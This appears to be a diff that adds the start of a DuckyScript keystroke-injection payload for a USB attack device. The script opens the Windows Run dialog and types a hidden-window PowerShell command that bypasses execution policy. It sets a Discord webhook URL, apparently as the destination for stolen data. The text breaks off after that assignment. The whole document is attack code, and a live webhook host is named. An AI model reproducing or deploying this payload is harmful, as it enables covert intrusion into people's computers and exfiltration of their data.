@@ -1,0 +1,4 @@
+DELAY 2000
+GUI r
+DELAY 250
+STRING powershell -w h -ep bypass $discord='<https://discord.com/api/webhooks/1221936993022513242/5nwCOuzPqn41n9xdgq9hcvIp2lC9eSdYPX1ffcG82X0vdvAhI8vEYSNUScEXMvDfcwmK'; 
